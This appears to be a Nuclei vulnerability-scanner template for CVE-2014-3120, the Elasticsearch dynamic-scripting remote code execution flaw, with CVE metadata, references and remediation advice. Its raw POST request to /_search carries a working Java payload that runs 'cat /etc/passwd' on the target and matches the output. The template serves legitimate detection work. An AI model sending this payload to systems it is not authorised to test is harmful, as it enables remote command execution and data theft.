http:
- matchers:
  - part: header
    type: word
    words:
    - application/json
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /_search?pretty HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language:\
    \ en\nContent-Type: application/x-www-form-urlencoded\n\n{\n    \"size\": 1,\n\
    \    \"query\": {\n      \"filtered\": {\n        \"query\": {\n          \"match_all\"\
    : {\n          }\n        }\n      }\n    },\n    \"script_fields\": {\n     \
    \   \"command\": {\n            \"script\": \"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\\
    \"cat /etc/passwd\\\").getInputStream()).useDelimiter(\\\"\\\\\\\\A\\\").next();\"\
    \n        }\n    }\n}\n"
id: CVE-2014-3120
info:
  author: pikpikcu
  classification:
    cpe: cpe:2.3:a:elasticsearch:elasticsearch:*:*:*:*:*:*:*:*
    cve-id: CVE-2014-3120
    cvss-metrics: CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P
    cvss-score: 6.8
    cwe-id: CWE-284
    epss-percentile: 0.99333
    epss-score: 0.85557
  description: 'The default configuration in Elasticsearch before 1.2 enables dynamic
    scripting, which allows remote attackers to execute arbitrary MVEL expressions
    and Java code via the source parameter to _search. Be aware this only violates
    the vendor''s intended security policy if the user does not run Elasticsearch
    in its own independent virtual machine.

    '
  impact: 'Allows remote attackers to execute arbitrary code on the affected system

    '
  metadata:
    fofa-query: index_not_found_exception
    max-request: 1
    product: elasticsearch
    vendor: elasticsearch
  name: ElasticSearch v1.1.1/1.2 RCE
  reference:
  - https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120
  - https://www.elastic.co/blog/logstash-1-4-3-released
  - https://nvd.nist.gov/vuln/detail/CVE-2014-3120
  - http://bouk.co/blog/elasticsearch-rce/
  - https://www.elastic.co/community/security/
  remediation: 'Upgrade to a patched version of ElasticSearch

    '
  severity: medium
  tags: cve2014,cve,rce,elasticsearch,kev,vulhub,elastic,vkev,vuln
